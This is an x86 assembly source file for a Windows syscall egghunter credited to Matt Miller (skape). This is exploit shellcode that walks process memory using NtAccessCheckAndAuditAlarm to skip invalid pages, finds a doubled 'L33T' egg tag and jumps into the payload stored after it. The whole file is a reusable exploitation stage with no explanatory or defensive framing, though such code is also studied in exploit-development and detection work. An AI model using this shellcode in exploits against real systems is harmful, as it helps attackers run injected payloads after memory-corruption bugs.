[BITS 32]
; Matt Millers (skapes) syscall egghunter

global _start

loop_inc_page:
    or dx, 0x0fff ; Add PAGE_SIZE-1 to edx

loop_inc_one:
    inc edx ; Increment our pointer by one

loop_check:
    push edx ; Save edx
    push byte 0x2 ; Push NtAccessCheckAndAuditAlarm
    pop eax ; Pop into eax
    int 0x2e ; Perform the syscall
    cmp al, 0x05 ; Did we get 0xc0000005 (ACCESS_VIOLATION) ?
    pop edx ; Restore edx

loop_check_8_valid:
    je loop_inc_page ; Yes, invalid ptr, go to the next page

is_egg:
    mov eax, 0x5433334c ; Throw our egg in eax
    mov edi, edx ; Set edi to the pointer we validated
    scasd ; Compare the dword in edi to eax
    jnz loop_inc_one ; No match? Increment the pointer by one
    scasd ; Compare the dword in edi to eax again (which is now edx + 4)
    jnz loop_inc_one ; No match? Increment the pointer by one

matched:
    jmp edi